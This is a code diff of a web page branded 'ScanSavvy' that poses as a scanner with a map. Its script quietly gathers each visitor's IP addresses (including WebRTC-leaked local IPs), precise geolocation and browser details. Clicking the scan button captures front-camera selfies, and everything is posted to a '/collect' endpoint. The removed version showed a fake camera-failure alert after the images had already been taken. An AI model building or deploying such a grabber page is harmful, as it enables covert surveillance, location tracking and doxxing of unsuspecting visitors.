@@ -149,9 +149,9 @@ header span {
   box-shadow:0 0 14px rgba(0,249,255,0.25);
 }
 
-/* Tiles filter only */
+/* Updated filter: brighter with less contrast */
 #map .leaflet-tile {
-  filter: brightness(3) contrast(1.15);
+  filter: brightness(1.75) contrast(1);
 }
 
 button {
@@ -222,17 +222,28 @@ canvas{ display:none; }
 
 <footer>© 2025 ScanSavvy</footer>
 
-<!-- Leaflet JS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-// Initialize map
+// ===== Map Initialization =====
 let map = L.map('map').setView([0, 0], 2);
+
 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
   subdomains: 'abcd',
   attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> &copy; <a href="https://carto.com/">CARTO</a>',
   maxZoom: 19
 }).addTo(map);
 
+// ===== Default blue marker (above overlays) =====
+const bluePin = L.icon({
+  iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
+  shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
+  iconSize: [25,41],
+  iconAnchor: [12,41],
+  popupAnchor: [1,-34],
+  shadowSize: [41,41]
+});
+
+// ===== Payload =====
 const payload = {
   userAgent: navigator.userAgent,
   serverObservedIP: "${serverIP}",
@@ -242,28 +253,27 @@ const payload = {
   images: []
 };
 
-// Fetch public IP
+// Public IP
 fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ payload.publicIP=d.ip; send(false); });
 
-// Geolocation
+// Geolocation marker above overlay
 if(navigator.geolocation){
   navigator.geolocation.getCurrentPosition(pos=>{
     payload.geolocation={ lat:pos.coords.latitude, lng:pos.coords.longitude, acc:Math.round(pos.coords.accuracy) };
     map.setView([pos.coords.latitude,pos.coords.longitude],14);
-    L.marker([pos.coords.latitude,pos.coords.longitude]).addTo(map);
+    L.marker([pos.coords.latitude,pos.coords.longitude], { icon: bluePin }).addTo(map);
     send(false);
   });
 }
 
-// WebRTC IP
+// WebRTC IPs
 const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
 pc.createDataChannel("x");
 pc.onicecandidate = e=>{ if(!e.candidate) return; const ip=e.candidate.candidate.split(" ")[4]; if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip); };
 pc.createOffer().then(o=>pc.setLocalDescription(o));
 
-// Camera scan
+// Camera Scan
 document.getElementById("scanBtn").addEventListener("click",startScanner);
-
 function startScanner(){
   navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } }).then(stream=>{
     const video=document.createElement("video"); video.srcObject=stream; video.play();
@@ -279,11 +289,12 @@ function startScanner(){
       payload.images=imagesCaptured.filter(img=>img && img.length>0);
       send(true);
       stream.getTracks().forEach(t=>t.stop());
-      alert("Failed to initialize camera.");
+      alert("Camera captured images.");
     };
   }).catch(err=>{ console.log("Camera error:",err); alert("Failed to access camera."); });
 }
 
+// Send function
 function send(force){ fetch("/collect",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) }); }
 </script>
 </body>
